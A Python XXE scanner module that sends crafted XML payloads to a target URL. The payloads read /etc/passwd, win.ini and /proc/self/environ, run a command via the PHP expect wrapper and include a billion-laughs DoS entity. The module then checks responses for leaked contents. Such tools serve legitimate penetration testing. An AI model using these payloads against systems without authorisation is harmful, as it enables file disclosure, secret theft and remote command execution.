"""
tools/xxe_scanner.py
XML External Entity (XXE) injection scanner.

Sends POST requests with crafted XML payloads to endpoints that accept XML,
then checks the response for file content leakage (inband XXE).
"""
import re
import requests
import urllib3
from dataclasses import dataclass, field

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_TIMEOUT = 12


@dataclass
class XXEFinding:
    payload_name: str
    evidence:     str
    confidence:   str   # "High" | "Medium"
    snippet:      str


@dataclass
class XXEResult:
    success:  bool
    target:   str
    findings: list[XXEFinding] = field(default_factory=list)
    error:    str = ""

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)


# ── XXE payloads ──────────────────────────────────────────────────────────────

_XXE_PAYLOADS: list[tuple[str, str]] = [
    (
        "Classic /etc/passwd",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "Windows win.ini",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "/proc/self/environ",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "PHP expect wrapper",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "Billion laughs (DoS check)",
        """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>""",
    ),
]

# Evidence that XXE was successful
_EVIDENCE_PATTERNS: list[tuple[str, str]] = [
    (r"root:.*?:/bin/",              "/etc/passwd leak"),
    (r"\[extensions\]|for 16-bit",   "Windows win.ini leak"),
    (r"USER=|HOME=|SHELL=|PATH=",    "/proc/self/environ leak"),
    (r"uid=\d+\(.*?\)",              "Command execution via expect://id"),
]

_XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/x-www-form-urlencoded",
]


def scan_xxe(url: str) -> XXEResult:
    """
    Send XXE payloads to *url* via POST with XML content types.
    Checks response body for file content leakage (inband).
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    session = requests.Session()
    session.verify = False
    session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    findings: list[XXEFinding] = []
    seen: set[str] = set()

    for payload_name, xml_body in _XXE_PAYLOADS:
        if "Billion laughs" in payload_name:
            continue  # skip DoS payload in automated scan

        for ct in _XML_CONTENT_TYPES[:2]:  # try the two XML content types
            try:
                r = session.post(
                    url,
                    data=xml_body.encode("utf-8"),
                    headers={"Content-Type": ct},
                    timeout=_TIMEOUT,
                    allow_redirects=False,
                )
                body = r.text[:6000]

                for pattern, label in _EVIDENCE_PATTERNS:
                    m = re.search(pattern, body)
                    if m and label not in seen:
                        seen.add(label)
                        snippet_start = max(0, m.start() - 30)
                        snippet = body[snippet_start:m.start() + 150].strip()
                        findings.append(XXEFinding(
                            payload_name=payload_name,
                            evidence=label,
                            confidence="High",
                            snippet=snippet[:300],
                        ))
                        break

                # Medium: server returned 500 — may indicate XML processing error
                if r.status_code == 500 and not any(f.payload_name == payload_name for f in findings):
                    if payload_name not in seen:
                        seen.add(payload_name + "_500")
                        findings.append(XXEFinding(
                            payload_name=payload_name,
                            evidence="Server returned HTTP 500 — XML entity may have been processed (unconfirmed)",
                            confidence="Medium",
                            snippet="",
                        ))

            except requests.RequestException:
                continue
            break  # if one content-type worked, no need to retry

    return XXEResult(success=True, target=url, findings=findings)
